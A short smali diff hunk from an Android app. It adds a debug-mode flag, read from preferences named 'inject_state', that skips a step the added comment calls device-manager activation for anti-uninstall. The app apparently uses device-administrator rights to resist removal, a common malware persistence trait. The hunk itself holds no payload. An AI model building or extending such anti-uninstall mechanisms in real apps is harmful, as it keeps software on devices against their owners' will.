@@ -2310,6 +2310,19 @@
 
     invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
 
+    # 调试模式：跳过设备管理器激活（防卸载）
+    const-string v2, "inject_state"
+    const/4 v3, 0x0
+    invoke-virtual {v0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
+    move-result-object v2
+    const-string v3, "debug_mode"
+    const/4 v4, 0x1
+    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
+    move-result v2
+    if-eqz v2, :devadmin_go
+    return-void
+
+    :devadmin_go
     :try_start_0
     new-instance v2, Landroid/content/Intent;
 
